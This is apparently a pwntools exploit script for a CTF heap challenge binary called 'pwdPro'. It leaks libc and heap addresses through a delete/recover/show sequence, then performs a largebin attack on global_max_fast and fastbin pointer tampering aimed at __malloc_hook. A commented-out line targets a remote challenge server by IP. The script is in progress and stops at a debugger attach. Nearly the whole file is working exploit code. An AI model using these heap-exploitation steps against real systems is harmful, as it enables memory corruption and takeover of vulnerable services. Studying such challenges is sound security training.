from pwn import *
from pwnlib.term.term import delete

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('pwdPro')
# io = remote('47.104.71.220', 38562)
libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so')
# libc = ELF('libc.so.6')
elf = ELF('pwdPro')


def add(index, name, size, pwd, first = False):
    io.sendlineafter('Input Your Choice:\n', '1')
    io.sendlineafter('Which PwdBox You Want Add:\n', str(index))
    io.sendlineafter('Input The ID You Want Save:', name)
    io.sendlineafter('Length Of Your Pwd:', str(size))
    io.sendafter('Your Pwd:', pwd)
    if first:
        io.recvuntil('First Add Done.Thx 4 Use. Save ID:')
        return io.recvn(8)


def edit(index, content):
    io.sendlineafter('Input Your Choice:\n', '2')
    io.sendlineafter('Which PwdBox You Want Edit:\n', str(index))
    io.send(content)
    sleep(0.1)


def show(index):
    io.sendlineafter('Input Your Choice:\n', '3')
    io.sendlineafter('Which PwdBox You Want Check:\n', str(index))


def delete(index):
    io.sendlineafter('Input Your Choice:\n', '4')
    io.sendlineafter('Idx you want 2 Delete:\n', str(index))


def recover(index):
    io.sendlineafter('Input Your Choice:\n', '5')
    io.sendlineafter('Idx you want 2 Recover:\n', str(index))


def leak():
    global random_num, heap_base, libc_base
    random_num = u64(add(0, 'pwd0', 0x440, p64(0) + b'\n', True))       # largebin1
    log.success('random_num: ' + hex(random_num))
    add(1, 'pwd1', 0x420, 'aaaa\n')
    add(1, 'pwd2', 0x430, 'aaaa\n')                                     # largebin2
    add(2, 'pwd3', 0x888, 'aaaa\n')                                     # fastbin1 for attack
    add(3, 'pwd4', 0x7f8, 'aaaa\n')                                     # fastbin2 for attack
    delete(0)
    recover(0)
    show(0)
    io.recvuntil('\nPwd is: ')
    libc_base = (u64(io.recvn(8)) ^ random_num) - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))
    add(4, 'pwd5', 0x450, 'aaaa\n')
    show(0)
    io.recvuntil('\nPwd is: ')
    heap_base = (u64(io.recvn(0x18)[-8:]) ^ random_num) - 0x290
    log.success('heap_base: ' + hex(heap_base))


def largebin_attack():
    global_max_fast = libc_base + libc.sym['__free_hook'] + 0x58
    log.success('global_max_fast: ' + hex(global_max_fast))
    delete(1)
    payload = p64(libc_base + libc.sym['__malloc_hook'] + 0x470) * 2
    payload += p64(heap_base + 0x290) + p64(global_max_fast - 0x20)
    edit(0, payload)
    add(4, 'pwd6', 0x450, 'aaaa\n')
    delete(2)
    recover(2)
    edit(2, p64(0x803) + b'\n')
    add(2, 'pwd3', 0x888, 'aaaa\n')

    delete(3)
    recover(3)
    edit(3, p64(libc_base + libc.sym['__malloc_hook'] + 0x450) + b'\n')
    add(3, 'pwd4', 0x7f8, 'aaaa\n')
    # add(4, 'fake_chunk', 0x7f8, p64(random_num) + b'\n')

    # io.recv()
    # delete(3)
    # recover(3)
    # edit(3, p64(libc_base + libc.sym['__malloc_hook'] + 0x450) + b'\n')
    # add(3, 'pwd4', 0x7f8, 'aaaa\n')
    gdb.attach(io)
    pause()


if __name__ == '__main__':
    leak()
    largebin_attack()
